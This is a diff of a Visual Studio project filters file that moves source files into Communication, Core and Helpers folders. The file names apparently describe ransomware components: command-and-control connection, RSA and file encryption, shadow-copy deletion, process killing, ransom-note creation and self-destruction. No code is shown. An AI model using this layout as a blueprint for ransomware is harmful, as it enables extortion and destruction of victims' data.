@@ -27,118 +27,115 @@
     <ClCompile Include="main.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="gen_uid.cpp">
-      <Filter>Source Files\Helpers</Filter>
+    <ClCompile Include="Communication\c2_conn.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="kill_procs.cpp">
-      <Filter>Source Files\Helpers</Filter>
+    <ClCompile Include="Communication\google_conn.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="gen_str.cpp">
-      <Filter>Source Files\Helpers</Filter>
+    <ClCompile Include="Communication\sendrequest.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="del_shadows.cpp">
-      <Filter>Source Files\Helpers</Filter>
+    <ClCompile Include="Core\check_perms.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="msg_screen.cpp">
-      <Filter>Source Files\Helpers</Filter>
+    <ClCompile Include="Core\disk_id.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="create_readmes.cpp">
-      <Filter>Source Files\Helpers</Filter>
+    <ClCompile Include="Core\file_enc.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="self_dest.cpp">
-      <Filter>Source Files\Helpers</Filter>
+    <ClCompile Include="Core\file_search.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="system_id.cpp">
-      <Filter>Source Files\Helpers</Filter>
+    <ClCompile Include="Core\rsa_enc.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="profiler.cpp">
-      <Filter>Source Files\Helpers</Filter>
+    <ClCompile Include="Helpers\create_readmes.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="google_conn.cpp">
-      <Filter>Source Files\Communication</Filter>
+    <ClCompile Include="Helpers\del_shadows.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="sendrequest.cpp">
-      <Filter>Source Files\Communication</Filter>
+    <ClCompile Include="Helpers\gen_str.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="check_perms.cpp">
-      <Filter>Source Files\Core</Filter>
+    <ClCompile Include="Helpers\gen_uid.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="disk_id.cpp">
-      <Filter>Source Files\Core</Filter>
+    <ClCompile Include="Helpers\kill_procs.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="file_enc.cpp">
-      <Filter>Source Files\Core</Filter>
+    <ClCompile Include="Helpers\msg_screen.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="rsa_enc.cpp">
-      <Filter>Source Files\Core</Filter>
+    <ClCompile Include="Helpers\profiler.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="file_search.cpp">
-      <Filter>Source Files\Core</Filter>
+    <ClCompile Include="Helpers\self_dest.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="c2_conn.cpp">
-      <Filter>Source Files\Communication</Filter>
+    <ClCompile Include="Helpers\system_id.cpp">
+      <Filter>Source Files</Filter>
     </ClCompile>
   </ItemGroup>
   <ItemGroup>
-    <ClInclude Include="gen_uid.h">
+    <ClInclude Include="Communication\c2_conn.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="kill_procs.h">
+    <ClInclude Include="Communication\google_conn.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="gen_str.h">
+    <ClInclude Include="Communication\sendrequest.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="del_shadows.h">
+    <ClInclude Include="Core\check_perms.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="msg_screen.h">
+    <ClInclude Include="Core\disk_id.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="create_readmes.h">
+    <ClInclude Include="Core\file_enc.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="self_dest.h">
+    <ClInclude Include="Core\file_search.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="system_id.h">
+    <ClInclude Include="Core\rsa_enc.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="profiler.h">
+    <ClInclude Include="Helpers\create_readmes.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="merge_dics.h">
+    <ClInclude Include="Helpers\del_shadows.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="google_conn.h">
+    <ClInclude Include="Helpers\gen_str.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="json.hpp">
+    <ClInclude Include="Helpers\gen_uid.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="sendrequest.h">
+    <ClInclude Include="Helpers\json.hpp">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="check_perms.h">
+    <ClInclude Include="Helpers\kill_procs.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="disk_id.h">
+    <ClInclude Include="Helpers\merge_dics.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="file_enc.h">
+    <ClInclude Include="Helpers\msg_screen.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="rsa_enc.h">
+    <ClInclude Include="Helpers\profiler.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="file_search.h">
+    <ClInclude Include="Helpers\self_dest.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="c2_conn.h">
+    <ClInclude Include="Helpers\system_id.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-  </ItemGroup>
-  <ItemGroup>
-    <None Include="packages.config" />
   </ItemGroup>
 </Project>
